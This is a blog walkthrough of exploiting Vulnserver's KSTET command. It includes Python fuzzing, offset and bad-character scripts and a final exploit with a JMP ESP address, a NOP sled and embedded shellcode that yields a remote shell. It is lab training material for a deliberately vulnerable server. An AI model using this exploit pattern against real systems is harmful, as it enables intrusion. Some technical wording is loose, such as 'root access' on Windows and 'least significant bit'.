---
layout: post
title: Vulnserver
---

<p class="message">
  Vulnserver is an intentionally vulnerable Windows based TCP server. It is commonly used to practice exploitation techniques like what I have done with it. 
  In this walk-through I have spun vulnserver up on a Windows 10 VM and will exploit it using a buffer overflow vulnerability within one of it's commands.
  I will be using the immunity debugger and pythons mona modules in order to exploit this application.
  <br>
  Everything I used in this walkthrough I leaned from the Pratical Ethical Hacking course <a href="">on Udemy</a> by Heath Adams.
</p>

Just like with any other pentest I start by scanning the target with nmap.

<img src="https://raw.githubusercontent.com/lukej2680/lukej2680.github.io/master/_images/vulnserver/nmap_scan.png">
<img src="https://raw.githubusercontent.com/lukej2680/lukej2680.github.io/master/_images/vulnserver/nmap_scan2.png">

Port 9999 is the port vulnserver is running on and the one I am interested in.\
Using netcat I connect to the server.

<img src="https://raw.githubusercontent.com/lukej2680/lukej2680.github.io/master/_images/vulnserver/nc_connect.png">

In order to find a command vulnerable to buffer overflows I started by spiking the commands 

<p class="message">s_readline();<br>s_string("KSTET ");<br>s_string_variable("0");</p>

While spiking, I have the vulnserver application attached to immunity debugger. When running the KSTET spike the server crashes and observing immunity debugger 
shows me that the ESP and EIP are both overwritten with A's. Exactly what I'm looking for.

<img src="https://raw.githubusercontent.com/lukej2680/lukej2680.github.io/blob/master/_images/vulnserver/ID_spk_crash.png">

From immunity debugger I also see that the KSTET command adds special characters to the beggining of the input data. Specifically "/.:/". When writing scripts 
later I will need to remeber to append this to the beggining of my commands.\
Now that I have a vulnerable command to concentrate on I need to find the exact bytes at which the input data overwrites the EIP so I can overwrite it.\
To begin I'll use a fuzzing script to find a general byte size that crashed the program.

```
#!/usr/bin/python

import sys, socket
from time import sleep

buffer = "A" * 100

while True:
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('172.16.31.171',9999))
                
        print("Fuzzing KSTET feild with %s bytes" % len(buffer))
        s.recv(1024)
        s.send(('KSTET /.:/' + buffer))
        s.close()
        sleep(1)
        buffer = buffer + "A"*100

    except:
        print "Fuzzing crashed at %s bytes" % str(len(buffer))
        sys.exit()
 ```
 
 <img src="https://raw.githubusercontent.com/lukej2680/lukej2680.github.io/blob/master/_images/vulnserver/ID_fuzz_crash.png">
 
 The script crashes the program at 200 bytes and observing immunity debugger shows me that the EIP is indeed overwritten.\
 This tells me that somewhere in those 200 bytes the EIP is being overwritten but does not tell me at exactly which bytes this is occuring. For that I use the pattern_create ruby module included in the metasploit-famework tools.\
Using 200 as a parameter (becuase that how long we need it to be to trigger the crash) the module generates a string for me to use to crash the application. 
 
 <img src="https://raw.githubusercontent.com/lukej2680/lukej2680.github.io/blob/master/_images/vulnserver/pattern_create.png">
 
 Now I update my script from earlier and send the new command.
 
 ```
 #!/usr/bin/python

import sys, socket
from time import sleep
                                                                                                                    
offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"                     
                                                                                                                    
try:                                                                                                                
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)                                                              
    s.connect(('172.16.31.171',9999))                                                                               
                                                                                                                    
    s.send(('KSTET /.:/' + offset))                                                                                 
    s.close()                                                                                                       
                                                                                                                    
except:                                                                                                             
    print "Fuzzing crashed at %s bytes" % str(len(buffer))                                                          
    sys.exit() 
```

<img src="https://raw.githubusercontent.com/lukej2680/lukej2680.github.io/blob/master/_images/vulnserver/ID_offset_crash.png">

The program crashes and the EIP is overwritten with 41326341.\
This alone doesn't tell me much but using the the pattern_offset ruby module will show me the exact byte at which the EIP was overwritten.\
I pass the length of the of the command and the value of the EIP to the module.

<img src="https://raw.githubusercontent.com/lukej2680/lukej2680.github.io/blob/master/_images/vulnserver/pattern_offset.png">

Exact match at 66 bytes!\
This is great but it is always a good idea to verify information so modifying my script from before I'll send 66 bytes of A's and 4 bytes of B's. If the EIP is overwritten with just 42's then I know we have the correct offset.

```
#!/bin/python

import sys, socket
from time import sleep

shellcode = "A" * 66 + "B" * 4

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('172.16.31.171',9999))

    s.send(('KSTET /.:/' + shellcode))
    s.close()

except:
    sys.exit()
```

<img src="https://raw.githubusercontent.com/lukej2680/lukej2680.github.io/blob/master/_images/vulnserver/ID_offset_verify.png">

What do you know, the EIP is overwritten with 42's. Looks like I have the correct offset.\
Now that I have control of the EIP I need a spot in memory to have the instruction pointer point to where I can execute my payload.
To find such a specific spot I'll use mona modules with immunity debugger.

<img src="https://raw.githubusercontent.com/lukej2680/lukej2680.github.io/blob/master/_images/vulnserver/ID_mona_modules.png">

Looking at the list of modules available in the application I want to find one with very little memory protections so my payload can overwrite it. 
The very first module listed seems to fit the bill, Falses's across the board.\
Now that I know essfunc.dll has no memory protections I need to find its jmp code in order to point the EIP to this module.\
Luckily for me mona can help me with that too. Using mona find to look for the jmp code string \xff\xe4 in the module essfunc.dll

<img src="https://raw.githubusercontent.com/lukej2680/lukej2680.github.io/blob/master/_images/vulnserver/ID_jmp_code.png">

Choosing the first one, 625011af I now have a jmp code for the vulnerable module.\
You might think that's all I need to now exploit the service however I still need to search for bad characters. Bad characters are characters that may have been assigned special meaning in a program and therefore cannot be used in my shell code as they have a specific meaning to the processor.\
Using this script I send all possible bad characters at the application and examine the hex dump in immunity debugger. Any oddities in the dump will signify that character as being a bad character becuase it produced something other then the character it should be. 

```
#!/bin/python

import sys, socket
from time import sleep

badchars = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
badchars += "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
badchars += "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
badchars += "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
badchars += "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
badchars += "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
badchars += "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
badchars += "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

shellcode = "A" * 66 + "B" * 4 + badchars

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('172.16.31.171',9999))

    s.send(('KSTET /.:/' + shellcode))
    s.close()

except:
    sys.exit()
```

This application fortunatly has no bad characters other then the null character \\x00\
Now I have enough information to generate my shellcode.

<img src="https://raw.githubusercontent.com/lukej2680/lukej2680.github.io/blob/master/_images/vulnserver/shellcode.png">

Finally I write my exploit script.

```
#!/bin/python

import sys, socket
from time import sleep

shellcode = (
"\xbd\x35\x2e\x1b\xb9\xd9\xc9\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
"\x52\x31\x68\x12\x03\x68\x12\x83\xf5\x2a\xf9\x4c\x09\xda\x7f"
"\xae\xf1\x1b\xe0\x26\x14\x2a\x20\x5c\x5d\x1d\x90\x16\x33\x92"
"\x5b\x7a\xa7\x21\x29\x53\xc8\x82\x84\x85\xe7\x13\xb4\xf6\x66"
"\x90\xc7\x2a\x48\xa9\x07\x3f\x89\xee\x7a\xb2\xdb\xa7\xf1\x61"
"\xcb\xcc\x4c\xba\x60\x9e\x41\xba\x95\x57\x63\xeb\x08\xe3\x3a"
"\x2b\xab\x20\x37\x62\xb3\x25\x72\x3c\x48\x9d\x08\xbf\x98\xef"
"\xf1\x6c\xe5\xdf\x03\x6c\x22\xe7\xfb\x1b\x5a\x1b\x81\x1b\x99"
"\x61\x5d\xa9\x39\xc1\x16\x09\xe5\xf3\xfb\xcc\x6e\xff\xb0\x9b"
"\x28\x1c\x46\x4f\x43\x18\xc3\x6e\x83\xa8\x97\x54\x07\xf0\x4c"
"\xf4\x1e\x5c\x22\x09\x40\x3f\x9b\xaf\x0b\xd2\xc8\xdd\x56\xbb"
"\x3d\xec\x68\x3b\x2a\x67\x1b\x09\xf5\xd3\xb3\x21\x7e\xfa\x44"
"\x45\x55\xba\xda\xb8\x56\xbb\xf3\x7e\x02\xeb\x6b\x56\x2b\x60"
"\x6b\x57\xfe\x27\x3b\xf7\x51\x88\xeb\xb7\x01\x60\xe1\x37\x7d"
"\x90\x0a\x92\x16\x3b\xf1\x75\xb5\xac\xe6\x03\xad\xce\x18\x08"
"\xfc\x46\xfe\x7a\x10\x0f\xa9\x12\x89\x0a\x21\x82\x56\x81\x4c"
"\x84\xdd\x26\xb1\x4b\x16\x42\xa1\x3c\xd6\x19\x9b\xeb\xe9\xb7"
"\xb3\x70\x7b\x5c\x43\xfe\x60\xcb\x14\x57\x56\x02\xf0\x45\xc1"
"\xbc\xe6\x97\x97\x87\xa2\x43\x64\x09\x2b\x01\xd0\x2d\x3b\xdf"
"\xd9\x69\x6f\x8f\x8f\x27\xd9\x69\x66\x86\xb3\x23\xd5\x40\x53"
"\xb5\x15\x53\x25\xba\x73\x25\xc9\x0b\x2a\x70\xf6\xa4\xba\x74"
"\x8f\xd8\x5a\x7a\x5a\x59\x7a\x99\x4e\x94\x13\x04\x1b\x15\x7e"
"\xb7\xf6\x5a\x87\x34\xf2\x22\x7c\x24\x77\x26\x38\xe2\x64\x5a"
"\x51\x87\x8a\xc9\x52\x82")

shell = "A" * 66 + "\xaf\x11\x50\x62" + "\x90" * 32 + shellcode

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('172.16.31.171',9999))

    s.send(('KSTET /.:/' + shell))
    s.close()

except:
    sys.exit()
```

You might notice that I entered in the jmp code as "\\xaf\\x11\\x50\\x62" instead of "\\x62\\x50\\x11\xaf". This is becuase little endian architecture stores data least significant bit first. All intel processors are little endian and is the more common ordering of bytes between big and little endian.

Checking my netcat listener I see the exploit worked and I have root access to the Windows machine.

<img src="https://raw.githubusercontent.com/lukej2680/lukej2680.github.io/blob/master/_images/vulnserver/root.png">
